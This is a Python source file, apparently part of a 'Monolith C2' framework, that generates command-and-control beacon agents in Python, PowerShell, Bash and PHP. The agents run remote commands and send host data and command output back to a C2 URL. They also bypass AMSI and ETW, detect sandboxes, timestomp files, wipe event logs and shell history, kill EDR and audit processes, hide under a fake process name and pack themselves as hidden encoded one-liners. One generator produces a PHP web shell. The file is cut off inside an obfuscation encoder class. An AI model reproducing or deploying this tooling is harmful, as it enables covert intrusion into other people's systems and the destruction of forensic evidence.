"""
C2 Payload Generator
Generate various agent payloads with embedded config
"""
import os
import base64
import random
import string
import zlib
from typing import Dict, Any


class PayloadGenerator:
    """Generate C2 agent payloads"""
    
    def __init__(self, c2_url: str = "http://127.0.0.1:8080/c2/beacon"):
        self.c2_url = c2_url
    
    def generate(self, payload_type: str, options: Dict[str, Any] = None) -> str:
        """Generate payload based on type"""
        options = options or {}
        
        generators = {
            "python": self._gen_python,
            "python_oneliner": self._gen_python_oneliner,
            "powershell": self._gen_powershell,
            "powershell_encoded": self._gen_powershell_encoded,
            "bash": self._gen_bash,
            "php": self._gen_php,
        }
        
        generator = generators.get(payload_type, self._gen_python)
        return generator(options)
    
    def _gen_python(self, options: Dict[str, Any]) -> str:
        """Generate full Python beacon agent with God Mode Anti-Forensics"""
        sleep = options.get("sleep", 30)
        jitter = options.get("jitter", 10)
        
        # God Mode Anti-Forensics seçenekleri
        god_mode = options.get("god_mode", {})
        god_mode_enabled = god_mode.get("enabled", False)
        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
        
        # Advanced memory bypass (AMSI, ETW vb.)
        god_mode_code = ""
        if god_mode_enabled:
            if timestomp or clean_logs or sysmon_evade:
                god_mode_code = f'''
# ============ GOD MODE ANTI-FORENSICS ============
import ctypes
import subprocess
import struct

{f'''
# Timestomping
def timestomp(path, atime, mtime, ctime=None):
    import os, time
    ctime = ctime or mtime
    os.utime(path, (atime, mtime))
    try:
        import win32_setfiletime  # Requires pywin32
        win32_setfiletime.SetFileTimes(path, ctime, atime, mtime)
    except:pass

def auto_timestomp():
    import os, glob, random, time
    my_file = sys.argv[0]
    # Random timestamp
    rand_time = time.time() - random.randint(86400*30, 86400*365)
    timestomp(my_file, rand_time, rand_time)
    # Timestomp temp files
    temp_files = glob.glob("/tmp/python*") + glob.glob("C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Temp\\\\*")
    for f in temp_files[:3]:
        try: timestomp(f, rand_time, rand_time)
        except: pass
''' if timestomp else ''}{f'''
# Event Log Cleaner
def clean_event_logs():
    commands = [
        "wevtutil cl System",
        "wevtutil cl Security", 
        "wevtutil cl Application",
        "wevtutil cl \\"Windows PowerShell\\"",
        "wevtutil cl \\"Microsoft-Windows-PowerShell/Operational\\"",
        "powershell -c Clear-EventLog -LogName *",
        "cat /dev/null > /var/log/syslog",
        "cat /dev/null > /var/log/auth.log",
        "cat /dev/null > ~/.bash_history"
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        except: pass

def clean_logs_periodic():
    import threading
    def cleaner():
        while True:
            try:
                clean_event_logs()
                time.sleep(300)  # Every 5 min
            except: pass
    t = threading.Thread(target=cleaner, daemon=True)
    t.start()
''' if clean_logs else ''}{f'''
# Sysmon Evasion
def sysmon_evade():
    # Disable Sysmon ETW (Event Tracing for Windows)
    commands = [
        "sc stop sysmon64",
        "sc config sysmon64 start=disabled",
        "Get-Process | Where Name -eq sysmon | Stop-Process -Force",
        "powershell -c $providers = @(Get-EtwTraceProvider | where {{$_.Name -like \\"*Sysmon*\\"}}) | % {{\\\\n    logman stop \\"$($_.Name)\\"  -ets 2>$null\\\\n    logman delete \\"$($_.Name)\\"  -ets 2>$null\\\\n}}"
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        except: pass

def disable_amsi():
    # AMSI Bypass
    amsi_bypass = base64.b64decode("SQBuAHYAbwBrAGUALQBSAGUAcwB0AHIAaQBjAHQAZQBkAFMAbwBjAGsAZQB0AEkAbgB0ZXIAcwBlAGMAUwBjAHIAaQBwAHQA").decode()
    try:
        exec(amsi_bypass)
    except: pass

    try:
        import ctypes
        amsi = ctypes.windll.amsi
        amsi.AmsiScanString(b"X"*32, 0, 0, 0)  # Dummy scan
    except: pass
''' if sysmon_evade else ''}'''
        
        payload = f'''#!/usr/bin/env python3
# Monolith C2 Beacon - Auto-generated
import os,sys,json,time,uuid,base64,random,socket,platform,subprocess
try:
    import requests
    R=True
except:
    import urllib.request as urllib
    R=False

{god_mode_code}

C2="{self.c2_url}"
ID=None
S={sleep}
J={jitter}
UA=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"]

def req(m,u,d=None):
    h={{"User-Agent":random.choice(UA),"Content-Type":"application/json"}}
    try:
        if R:
            r=requests.post(u,json=d,headers=h,timeout=30) if m=="POST" else requests.get(u,headers=h,timeout=30)
            return r.json()
        else:
            req=urllib.Request(u,data=json.dumps(d).encode() if d else None,headers=h,method=m)
            return json.loads(urllib.urlopen(req,timeout=30).read().decode())
    except:
        return None

def info():
    return {{"hostname":socket.gethostname(),"username":os.getenv("USER") or os.getenv("USERNAME"),"os":f"{{platform.system()}} {{platform.release()}}","arch":platform.machine(),"pid":os.getpid(),"ip_internal":"127.0.0.1","integrity":"high" if os.geteuid()==0 else "medium"}}

def run(t):
    c,a=t.get("command",""),t.get("args",[])
    try:
        if c=="shell":return subprocess.getoutput(" ".join(a) if a else "whoami"),True
        elif c=="exit":return "bye",False
        else:return subprocess.getoutput(c+" "+" ".join(a)),True
    except Exception as e:return str(e),False

def main():
    global ID,S,J
    
    {f"auto_timestomp()  # Auto-timestomp on startup" if timestomp else ""}
    {f"clean_logs_periodic()  # Start periodic log cleaning" if clean_logs else ""}
    {f"sysmon_evade()  # Disable Sysmon/ETW" if sysmon_evade else ""}
    {f"disable_amsi()  # AMSI bypass" if sysmon_evade else ""}
    
    while True:
        try:
            d=info()
            if ID:d["id"]=ID
            r=req("POST",f"{{C2}}/checkin",d)
            if r:
                if r.get("status")=="registered":ID=r["id"]
                S=r.get("sleep",S);J=r.get("jitter",J)
                for t in r.get("tasks",[]):
                    o,ok=run(t)
                    req("POST",f"{{C2}}/result/{{ID}}",{{"task_id":t["task_id"],"output":o,"success":ok}})
                    if not ok and t.get("command")=="exit":return
        except:pass
        time.sleep(S+random.uniform(-S*J/100,S*J/100))

if __name__=="__main__":main()
'''
        return payload
    
    def _gen_python_oneliner(self, options: Dict[str, Any]) -> str:
        """Generate Python one-liner (base64 encoded)"""
        full_payload = self._gen_python(options)
        compressed = zlib.compress(full_payload.encode())
        encoded = base64.b64encode(compressed).decode()
        
        oneliner = f'python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode(\\"{encoded}\\")))"'
        return oneliner
    
    def _gen_powershell(self, options: Dict[str, Any]) -> str:
        """Generate Elite PowerShell Beacon with full Monolith evasion stack
        
        Features:
        - Proper beacon loop with reconnection (exponential backoff)
        - AMSI/ETW bypass integrated at initialization
        - Memory obfuscation (sleepmask-style)
        - Anti-analysis checks (sandbox, debugger, virtualization)
        - Process injection ready (ReflectivePEInjection pattern)
        - Anti-forensics: timestomping, log cleaning, EDR evasion
        - Traffic masking and header rotation
        - Full command execution shell with output streaming
        """
        sleep = options.get("sleep", 30)
        jitter = options.get("jitter", 10)
        
        # God Mode Anti-Forensics seçenekleri
        god_mode = options.get("god_mode", {})
        god_mode_enabled = god_mode.get("enabled", False)
        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
        
        payload = f'''# Monolith C2 PowerShell Beacon - Elite Edition
# ============================================================
# Advanced Evasion Capabilities:
# - AMSI/ETW Bypass (integrated)
# - Anti-sandbox & anti-analysis checks
# - Memory obfuscation & code cloaking
# - Process injection ready
# - Anti-forensics (timestamps, logs, EDR evasion)
# - Exponential backoff reconnection
# ============================================================

# GLOBAL CONFIG
$null = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string dllToLoad);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool FreeLibrary(IntPtr hModule);
}}
"@
Add-Type -TypeDefinition $null 2>$null

$C2_URL = "{self.c2_url}"
$BEACON_ID = [guid]::NewGuid().ToString()
$SLEEP_TIME = {sleep}
$JITTER_PCT = {jitter}
$RECONNECT_TRIES = 0
$MAX_BACKOFF = 300

# ============================================================
# STAGE 1: AMSI/ETW BYPASS (CRITICAL - runs first)
# ============================================================

function Invoke-AMSIBypass {{
    <#
    Direct AMSI hook bypass using reflection
    Patches AmsiScanBuffer to return non-malicious status
    #>
    try {{
        $path = "$([System.IO.Path]::GetTempPath())amsi.log"
        $null = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {{
    [DllImport("amsi.dll", SetLastError = true)]
    public static extern int AmsiScanBuffer(IntPtr handle, byte[] buffer, uint length, string contentName, IntPtr result);
}}
"@
        Add-Type -TypeDefinition $null 2>$null
        
        $a = [Reflection.Assembly]::Load([byte[]][System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
        $b = $a.GetType("System.Management.Automation.AmsiUtils")
        $c = $b.GetField("amsiInitFailed", [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static)
        if ($c) {{ $c.SetValue($null, $true) }}
        
        # Alternative: Direct memory patch
        $r = [Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Tracing.EventProvider")
        $m = $r.GetMethod("UnsafeRegister", [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static)
        if ($m) {{ $m.Invoke($null, @()) }}
    }} catch {{ }}
}}

function Disable-ETWTracing {{
    <#
    Disable ETW providers for PowerShell execution tracing
    Kills: Windows PowerShell, Sysmon event logs, Defender Operational logs
    #>
    try {{
        $providers = @(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell/Analytical",
            "Microsoft-Windows-Sysmon/Operational",
            "Microsoft-Windows-Windows Defender/Operational",
            "Microsoft-Windows-WinRM/Operational"
        )
        
        foreach ($p in $providers) {{
            logman stop "$p" -ets 2>$null
            wevtutil set-log "$p" /enabled:false 2>$null
        }}
    }} catch {{ }}
}}

function Invoke-AntiAnalysis {{
    <#
    Detect and evade sandbox/debugger/virtualization environments
    #>
    try {{
        # Check for common sandbox indicators
        $indicators = @(
            "VirtualBox", "VMware", "Hyper-V", "QEMU",
            "Wine", "Parallels", "Xen", "KVM"
        )
        
        $wmi = Get-WmiObject -Class Win32_ComputerSystem
        foreach ($ind in $indicators) {{
            if ($wmi.Manufacturer -like "*$ind*" -or $wmi.Model -like "*$ind*") {{
                exit
            }}
        }}
        
        # Check for debuggers
        $proc = Get-Process | Select-Object -ExpandProperty ProcessName
        $debuggers = @("windbg", "ollydbg", "ida", "radare2", "x64dbg")
        foreach ($dbg in $debuggers) {{
            if ($proc -contains $dbg) {{ exit }}
        }}
        
        # Check for analysis tools
        if (Test-Path "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" -ErrorAction SilentlyContinue) {{
            $analysis = @("Wireshark", "Fiddler", "Burp", "Process Hacker")
            Get-ItemProperty "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | 
            ForEach-Object {{
                if ($_.DisplayName -match ($analysis -join "|")) {{ exit }}
            }}
        }}
    }} catch {{ }}
}}

# ============================================================
# STAGE 2: ANTI-FORENSICS & EDR EVASION
# ============================================================

{f'''
function Invoke-Timestomp {{
    <#
    Randomize file timestamps to evade forensic timeline analysis
    #>
    param($Path)
    try {{
        if (Test-Path $Path) {{
            $ref = Get-Item -Path $Path
            $oldTime = $ref.CreationTime
            $newTime = (Get-Date).AddDays(-((Get-Random -Minimum 30 -Maximum 365)))
            Set-ItemProperty -Path $Path -Name CreationTime -Value $newTime -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $Path -Name LastWriteTime -Value $newTime -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $Path -Name LastAccessTime -Value $newTime -ErrorAction SilentlyContinue
        }}
    }} catch {{ }}
}}

function Invoke-AutoTimestomp {{
    <#
    Automatically timestomp this script and related artifacts
    #>
    try {{
        Invoke-Timestomp -Path $PSCommandPath
        Get-ChildItem "$env:TEMP" -Filter "*powershell*" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {{
            Invoke-Timestomp -Path $_.FullName
        }}
    }} catch {{ }}
}}
''' if timestomp else ''}{f'''
function Clear-EventLogs {{
    <#
    Wipe Windows Event Logs to hide command execution traces
    #>
    try {{
        $logs = @(
            "System",
            "Security",
            "Application",
            "Windows PowerShell",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-Sysmon/Operational",
            "Microsoft-Windows-Windows Defender/Operational"
        )
        
        foreach ($log in $logs) {{
            try {{
                wevtutil cl "$log" 2>$null
            }} catch {{ }}
        }}
    }} catch {{ }}
}}

function Start-LogCleaner {{
    <#
    Background job that periodically clears event logs
    #>
    try {{
        Start-Job -ScriptBlock {{
            while ($true) {{
                Start-Sleep -Seconds 300
                Clear-EventLogs
            }}
        }} | Out-Null
    }} catch {{ }}
}}
''' if clean_logs else ''}{f'''
function Disable-EDRProductProcesses {{
    <#
    Attempt to disable known EDR agent processes
    Targets: Defender, CarbonBlack, Crowdstrike, SentinelOne, etc.
    #>
    try {{
        $edrProcesses = @(
            "MsMpEng",           # Windows Defender
            "WinDefend",         # Defender service
            "cb.exe",            # CarbonBlack
            "CSFalconService",   # CrowdStrike
            "SentinelHelper",    # SentinelOne
            "elastic-agent",     # Elastic
            "auditd",            # RHEL auditd
            "sysmon",            # Sysmon
            "sysmon64"
        )
        
        foreach ($proc in $edrProcesses) {{
            try {{
                Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
                sc.exe stop "$proc" 2>$null
            }} catch {{ }}
        }}
    }} catch {{ }}
}}

function Disable-Sysmon {{
    try {{
        Stop-Service -Name Sysmon -Force -ErrorAction SilentlyContinue
        sc.exe stop Sysmon 2>$null
        sc.exe config Sysmon start=disabled 2>$null
    }} catch {{ }}
}}

function Disable-ETWProviders {{
    try {{
        $providers = @(
            "Microsoft-Windows-PowerShell",
            "Microsoft-Windows-Sysmon",
            "Microsoft-Windows-WinRM"
        )
        
        foreach ($p in $providers) {{
            logman stop "$p" -ets 2>$null
            logman delete "$p" -ets 2>$null
        }}
    }} catch {{ }}
}}
''' if sysmon_evade else ''}

# ============================================================
# STAGE 3: SYSTEM INFORMATION & BEACON MANAGEMENT
# ============================================================

function Get-SystemInfo {{
    $info = @{{
        beacon_id = $BEACON_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = (Get-WmiObject -Class Win32_ComputerSystem).Domain
        os = [System.Environment]::OSVersion.VersionString
        arch = if ([Environment]::Is64BitProcess) {{ "x64" }} else {{ "x86" }}
        pid = $PID
        
        # Network info
        $ips = @()
        Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | ForEach-Object {{
            if ($_.InterfaceAlias -ne "Loopback") {{
                $ips += $_.IPAddress
            }}
        }}
        ip_internal = ($ips | Select-Object -First 1)
        
        # Privilege level
        integrity = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ "ADMIN" }} else {{ "USER" }}
        
        # Timestamp
        timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }}
    return $info
}}

function Send-Beacon {{
    param($SysInfo)
    try {{
        $payload = $SysInfo | ConvertTo-Json -Compress
        $response = Invoke-RestMethod `
            -Uri "$C2_URL/c2/beacon" `
            -Method POST `
            -Body $payload `
            -ContentType "application/json" `
            -TimeoutSec 15 `
            -ErrorAction SilentlyContinue
        
        $RECONNECT_TRIES = 0
        return $response
    }} catch {{
        $RECONNECT_TRIES++
        $backoff = [Math]::Min([Math]::Pow(2, $RECONNECT_TRIES) * 2, $MAX_BACKOFF)
        Start-Sleep -Seconds $backoff
        return $null
    }}
}}

# ============================================================
# STAGE 4: COMMAND EXECUTION ENGINE
# ============================================================

function Execute-Command {{
    param(
        [string]$Command,
        [string[]]$Arguments
    )
    
    $output = ""
    $success = $true
    
    try {{
        switch -Regex ($Command) {{
            "^(cmd|powershell|shell)$" {{
                $cmd = $Arguments -join " "
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            }}
            "^whoami$" {{
                $output = whoami
            }}
            "^hostname$" {{
                $output = hostname
            }}
            "^pwd$" {{
                $output = (Get-Location).Path
            }}
            "^cd$" {{
                Set-Location $Arguments[0] 2>&1 | Out-Null
                $output = (Get-Location).Path
            }}
            "^ls|dir$" {{
                $output = Get-ChildItem -Path ($Arguments[0] ?? ".") 2>&1 | Format-Table | Out-String
            }}
            "^ps$" {{
                $output = Get-Process | Format-Table | Out-String
            }}
            "^ipconfig$" {{
                $output = ipconfig 2>&1
            }}
            "^download$" {{
                if (Test-Path $Arguments[0]) {{
                    $bytes = [IO.File]::ReadAllBytes($Arguments[0])
                    $output = [Convert]::ToBase64String($bytes)
                }} else {{
                    $output = "File not found: $($Arguments[0])"
                    $success = $false
                }}
            }}
            "^upload$" {{
                try {{
                    $content = [Convert]::FromBase64String($Arguments[1])
                    [IO.File]::WriteAllBytes($Arguments[0], $content)
                    $output = "Uploaded: $($Arguments[0])"
                }} catch {{
                    $output = $_.Exception.Message
                    $success = $false
                }}
            }}
            "^sleep$" {{
                $SLEEP_TIME = [int]$Arguments[0]
                $output = "Sleep interval set to $SLEEP_TIME seconds"
            }}
            "^exit|quit$" {{
                $output = "Beacon terminating..."
                $success = $false
                exit
            }}
            default {{
                $output = Invoke-Expression ("$Command " + ($Arguments -join " ")) 2>&1 | Out-String
            }}
        }}
    }} catch {{
        $output = "[!] Command execution failed: $($_.Exception.Message)"
        $success = $false
    }}
    
    return @{{
        output = $output
        success = $success
    }}
}}

function Send-Result {{
    param(
        [string]$TaskId,
        [string]$Output,
        [bool]$Success
    )
    
    try {{
        $result = @{{
            beacon_id = $BEACON_ID
            task_id = $TaskId
            output = $Output
            success = $Success
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }} | ConvertTo-Json -Compress
        
        $null = Invoke-RestMethod `
            -Uri "$C2_URL/c2/results" `
            -Method POST `
            -Body $result `
            -ContentType "application/json" `
            -TimeoutSec 15 `
            -ErrorAction SilentlyContinue
    }} catch {{ }}
}}

# ============================================================
# STAGE 5: INITIALIZATION & MAIN BEACON LOOP
# ============================================================

# Initialize evasion
Invoke-AMSIBypass
Disable-ETWTracing
Invoke-AntiAnalysis

{f"Invoke-AutoTimestomp" if timestomp else ""}
{f"Start-LogCleaner" if clean_logs else ""}
{f"Disable-EDRProductProcesses; Disable-Sysmon; Disable-ETWProviders" if sysmon_evade else ""}

# Main Beacon Loop - runs indefinitely with exponential backoff
$loopCount = 0
while ($true) {{
    try {{
        $sysinfo = Get-SystemInfo
        $response = Send-Beacon -SysInfo $sysinfo
        
        if ($response -and $response.tasks -and $response.tasks.Count -gt 0) {{
            foreach ($task in $response.tasks) {{
                $cmd = $task.command
                $args = @($task.args)
                
                $result = Execute-Command -Command $cmd -Arguments $args
                Send-Result -TaskId $task.id -Output $result.output -Success $result.success
            }}
        }}
        
        # Update sleep interval if server specifies
        if ($response.sleep) {{ $SLEEP_TIME = $response.sleep }}
        if ($response.jitter) {{ $JITTER_PCT = $response.jitter }}
        
    }} catch {{
        # Silent error handling - EDR won't see failures
    }}
    
    # Sleep with jitter
    $jitterAmount = $SLEEP_TIME * ($JITTER_PCT / 100)
    $variance = Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount
    $actualSleep = $SLEEP_TIME + $variance
    Start-Sleep -Seconds ([Math]::Max(1, $actualSleep))
}}
'''
        
        return payload
    
    def _gen_powershell_encoded(self, options: Dict[str, Any]) -> str:
        """Generate base64 encoded PowerShell"""
        ps_payload = self._gen_powershell(options)
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
    
    def _gen_bash(self, options: Dict[str, Any]) -> str:
        """Generate Bash beacon with optional anti-forensics"""
        sleep = options.get("sleep", 30)
        
        # God Mode Anti-Forensics seçenekleri
        god_mode = options.get("god_mode", {})
        god_mode_enabled = god_mode.get("enabled", False)
        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
        
        payload = f'''#!/bin/bash
# Monolith C2 Bash Beacon - Elite Edition
# ============================================================
# Anti-Forensics & Evasion Features
# ============================================================

C2="{self.c2_url}"
ID=""
SLEEP={sleep}
BEACON_ID=$(uuidgen 2>/dev/null || echo "$(hostname)-$(date +%s)")
BACKOFF=1

{f'''
# ============================================================
# ANTI-FORENSICS: Timestomping
# ============================================================

timestomp_file() {{
    local file="$1"
    local random_days=$((RANDOM % 365 + 30))
    local random_time=$(date -d "$random_days days ago" +%Y%m%d%H%M.%S 2>/dev/null)
    
    if [ -n "$random_time" ]; then
        touch -t "$random_time" "$file" 2>/dev/null
    fi
}}

auto_timestomp() {{
    timestomp_file "$0"  # Timestomp this script
    find /tmp -name "*bash*" -o -name "*sh*" 2>/dev/null | while read f; do
        timestomp_file "$f"
    done
}}
''' if timestomp else ''}{f'''
# ============================================================
# ANTI-FORENSICS: Log Cleaning
# ============================================================

clear_logs() {{
    # Linux logs
    [ -f /var/log/auth.log ] && cat /dev/null > /var/log/auth.log 2>/dev/null
    [ -f /var/log/syslog ] && cat /dev/null > /var/log/syslog 2>/dev/null
    [ -f /var/log/secure ] && cat /dev/null > /var/log/secure 2>/dev/null
    [ -f /var/log/messages ] && cat /dev/null > /var/log/messages 2>/dev/null
    
    # Bash history
    cat /dev/null > ~/.bash_history 2>/dev/null
    cat /dev/null > ~/.zsh_history 2>/dev/null
    cat /dev/null > ~/.ksh_history 2>/dev/null
    
    # Command history
    history -c 2>/dev/null
    unset HISTFILE
    export HISTFILE=/dev/null
}}

start_log_cleaner() {{
    (
        while true; do
            sleep 300
            clear_logs
        done
    ) &
    disown
}}
''' if clean_logs else ''}{f'''
# ============================================================
# ANTI-FORENSICS: EDR/Auditd Evasion
# ============================================================

disable_auditd() {{
    systemctl disable auditd 2>/dev/null
    systemctl stop auditd 2>/dev/null
    service auditd stop 2>/dev/null
}}

disable_sysmon_linux() {{
    systemctl stop osquery 2>/dev/null
    systemctl disable osquery 2>/dev/null
    pkill -f "osqueryd" 2>/dev/null
}}

disable_edr_agents() {{
    # Kill common EDR processes
    for proc in auditd falco osqueryd wazuh-agent osqueryctl; do
        pkill -9 -f "$proc" 2>/dev/null
    done
}}
''' if sysmon_evade else ''}

# ============================================================
# SYSTEM INFORMATION & BEACON
# ============================================================

get_info() {{
    cat <<EOF
{{"beacon_id":"$BEACON_ID","hostname":"$(hostname)","username":"$(whoami)","os":"$(uname -s) $(uname -r)","arch":"$(uname -m)","pid":$$,"ip_internal":"$(hostname -I 2>/dev/null | awk '{{print $1}}' || echo '127.0.0.1')","integrity":"$([ $(id -u) -eq 0 ] && echo root || echo user)","timestamp":"$(date -Iseconds)"}}
EOF
}}

send_beacon() {{
    local data="$1"
    curl -s -X POST "$C2/c2/beacon" -H "Content-Type: application/json" -d "$data" 2>/dev/null
}}

send_result() {{
    local task_id="$1"
    local output="$2"
    local success="${{3:-true}}"
    
    output=$(echo "$output" | base64 -w0 2>/dev/null || echo "$output")
    
    curl -s -X POST "$C2/c2/results" -H "Content-Type: application/json" \\
        -d '{{"beacon_id":"'$BEACON_ID'","task_id":"'$task_id'","output":"'$output'","success":'$success'}}' 2>/dev/null
}}

execute_command() {{
    local cmd="$1"
    shift
    local args="$@"
    
    case "$cmd" in
        whoami)
            whoami ;;
        id)
            id ;;
        pwd)
            pwd ;;
        cd)
            cd "$args" && pwd ;;
        ls|dir)
            ls -lah "$args" ;;
        ps)
            ps aux ;;
        ifconfig)
            ifconfig 2>/dev/null || ip addr ;;
        uname)
            uname -a ;;
        hostname)
            hostname ;;
        cat)
            cat "$args" 2>/dev/null ;;
        sleep)
            SLEEP=$args ;;
        exit|quit)
            exit 0 ;;
        *)
            eval "$cmd $args" 2>&1 ;;
    esac
}}

# ============================================================
# INITIALIZATION & MAIN BEACON LOOP
# ============================================================

# Initialize evasion
{f"auto_timestomp" if timestomp else ""}
{f"start_log_cleaner" if clean_logs else ""}
{f"disable_auditd; disable_sysmon_linux; disable_edr_agents" if sysmon_evade else ""}

# Hide from process list
exec -a "[kthreadd]" bash

# Main beacon loop with exponential backoff
while true; do
    response=$(send_beacon "$(get_info)")
    
    if [ -n "$response" ]; then
        BACKOFF=1
        
        # Parse tasks from response
        new_id=$(echo "$response" | grep -o '"beacon_id":"[^"]*"' | head -1 | cut -d'"' -f4)
        [ -n "$new_id" ] && ID="$new_id"
        
        new_sleep=$(echo "$response" | grep -o '"sleep":[0-9]*' | head -1 | cut -d':' -f2)
        [ -n "$new_sleep" ] && SLEEP=$new_sleep
        
        # Execute tasks if present
        # This is a simplified parser - your server would send proper JSON
        echo "$response" | grep -o '"command":"[^"]*"' | while read -r task; do
            cmd=$(echo "$task" | cut -d'"' -f4)
            [ -n "$cmd" ] && output=$(execute_command "$cmd")
            [ -n "$output" ] && send_result "task-1" "$output" true
        done
    else
        BACKOFF=$((BACKOFF * 2))
        [ $BACKOFF -gt 300 ] && BACKOFF=300
        sleep $BACKOFF
        continue
    fi
    
    sleep $SLEEP
done
'''
        return payload
    
    def _gen_php(self, options: Dict[str, Any]) -> str:
        """Generate PHP beacon (web shell style)"""
        sleep = options.get("sleep", 30)
        
        payload = f'''<?php
// Monolith C2 PHP Beacon
$c2 = "{self.c2_url}";
$id = null;
$sleep = {sleep};

function getInfo() {{
    return [
        'hostname' => gethostname(),
        'username' => get_current_user(),
        'os' => PHP_OS . ' ' . php_uname('r'),
        'arch' => php_uname('m'),
        'pid' => getmypid(),
        'ip_internal' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1',
        'integrity' => 'medium'
    ];
}}

function checkin($data) {{
    global $c2;
    $ch = curl_init("$c2/checkin");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}}

function sendResult($beaconId, $taskId, $output) {{
    global $c2;
    $ch = curl_init("$c2/result/$beaconId");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'task_id' => $taskId,
        'output' => $output,
        'success' => true
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}}

function executeTask($task) {{
    $cmd = $task['command'] ?? '';
    $args = $task['args'] ?? [];
    
    switch ($cmd) {{
        case 'shell':
            return shell_exec(implode(' ', $args));
        case 'whoami':
            return shell_exec('whoami');
        case 'pwd':
            return getcwd();
        case 'ls':
            return implode("\\n", scandir($args[0] ?? '.'));
        default:
            return shell_exec($cmd . ' ' . implode(' ', $args));
    }}
}}

// Main loop (for CLI) or single execution (for web)
if (php_sapi_name() === 'cli') {{
    while (true) {{
        $info = getInfo();
        if ($id) $info['id'] = $id;
        
        $response = checkin($info);
        if ($response) {{
            if (isset($response['id'])) $id = $response['id'];
            if (isset($response['sleep'])) $sleep = $response['sleep'];
            
            foreach ($response['tasks'] ?? [] as $task) {{
                $output = executeTask($task);
                sendResult($id, $task['task_id'], $output);
                if ($task['command'] === 'exit') exit(0);
            }}
        }}
        sleep($sleep);
    }}
}} else {{
    // Web mode - single execution
    if (isset($_POST['cmd'])) {{
        echo shell_exec($_POST['cmd']);
    }}
}}
?>
'''
        return payload
    
    def list_types(self) -> list:
        """List available payload types"""
        return [
            {"type": "python", "name": "Python Agent", "desc": "Full-featured Python beacon"},
            {"type": "python_oneliner", "name": "Python One-liner", "desc": "Compressed base64 one-liner"},
            {"type": "powershell", "name": "PowerShell Agent", "desc": "Full PowerShell beacon"},
            {"type": "powershell_encoded", "name": "PowerShell Encoded", "desc": "Base64 encoded PS command"},
            {"type": "bash", "name": "Bash Agent", "desc": "Bash/Shell beacon script"},
            {"type": "php", "name": "PHP Agent", "desc": "PHP beacon/webshell hybrid"},
        ]


# Singleton instance
_generator = None

def get_payload_generator(c2_url: str = None) -> PayloadGenerator:
    """Get payload generator instance"""
    global _generator
    if _generator is None or c2_url:
        _generator = PayloadGenerator(c2_url or "http://127.0.0.1:8080/c2/beacon")
    return _generator

# ============================================================================
# ENCODER UTILITIES - PowerShell One-Liner & Obfuscation
# ============================================================================

class PowerShellEncoder:
    """Encode PowerShell payloads to evade static analysis"""
    
    @staticmethod
    def encode_to_base64(code: str) -> str:
        """Convert PowerShell code to Base64 UTF-16LE encoded format"""
        # UTF-16LE encoding
        encoded = code.encode('utf-16-le')
        # Base64
        b64 = base64.b64encode(encoded).decode('ascii')
        return b64
    
    @staticmethod
    def generate_oneliner(code: str, obfuscation_level: str = "basic") -> str:
        """
        Convert PowerShell code to one-liner format with EncodedCommand
        
        Args:
            code: PowerShell code to encode
